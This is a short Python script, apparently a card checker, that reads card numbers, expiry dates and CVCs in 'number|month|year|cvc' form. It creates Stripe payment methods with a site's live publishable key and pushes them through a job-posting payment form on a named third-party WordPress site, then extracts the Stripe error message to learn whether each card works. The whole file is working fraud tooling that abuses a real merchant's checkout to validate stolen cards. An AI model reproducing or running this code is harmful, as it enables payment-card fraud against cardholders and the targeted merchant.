import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F7f05e4e5d2%3B+stripe-js-v3%2F7f05e4e5d2%3B+card-element&key=pk_live_51JqnrtHyTJQ5PN2KMBmdNqJghqcjNLcPHzvwgC0sviEUgub1X1q1f0GTvoiEw11drDqfsYkndJCrmhms3yIY520500nssRiBAV'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	headers = {
	    'authority': 'pcdn.global',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://pcdn.global',
	    'referer': 'https://pcdn.global/organizations/post-a-job/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1747184749231',
	}
	
	data = {
	    'data': f'__fluent_form_embded_post_id=72&_fluentform_4_fluentformnonce=30ba2302fd&_wp_http_referer=%2Forganizations%2Fpost-a-job%2F&post_title=Coach&job_location=Street+27&jobtypes%5B%5D=49006&jobcategories%5B%5D=49121&post_content=%3Cp%3ECoach%3C%2Fp%3E&method_application=Email&application_email=rodamuser08%40gmail.com&organization_name=Coach&email_payment_receipt=rodamuser08%40gmail.com&short_description_organization=&url_websiteorganization=&url_twitter=&url_linkedin=&payment-coupon=&jobplan=49067&payment_starter=5&payment_method=stripe&__ff_all_applied_coupons=&__ff_all_applied_coupons=&__ff_all_applied_coupons=&vQzhaGNUxWl=beEL5amJA7&OfyNsP=No4ABJEDI2qV7Pf&oKNVZHQAg=DlwTX6WoHy.iac2&yApuzwiPZWMc=JiOEpoaZDV21Ncs7&featured_image%5B%5D=https%3A%2F%2Fpcdn.global%2Fwp-content%2Fuploads%2Ffluentform%2Ftemp%2F11cuREUldOwsoIUmXu0xrnhHRIy6sn1NHCQ7faBRMPJrV%2BPQpuNZkg%2F9es0KJvi8OrOysNd0s%2BZn01A8o7Aj5sRPLXL8UOfCTERXNoMsO6kcUwcUHu8EOdWyQgBiXjbm1TxFbGzXYCZPn78%2By3ZP4g%3D%3D&__stripe_payment_method_id={pm}',
	    'action': 'fluentform_submit',
	    'form_id': '4',
	    'vQzhaGNUxWl': 'beEL5amJA7',
	    'OfyNsP': 'No4ABJEDI2qV7Pf',
	    'oKNVZHQAg': 'DlwTX6WoHy.iac2',
	    'yApuzwiPZWMc': 'JiOEpoaZDV21Ncs7',
	}
	
	response = requests.post('https://pcdn.global/wp-admin/admin-ajax.php', params=params, headers=headers, data=data)
	
	try:	
		result = re.search(r'"errors":"Stripe Error: (.*?)"', response.text).group(1)
	except:
		result = response.text
			
	return (result)
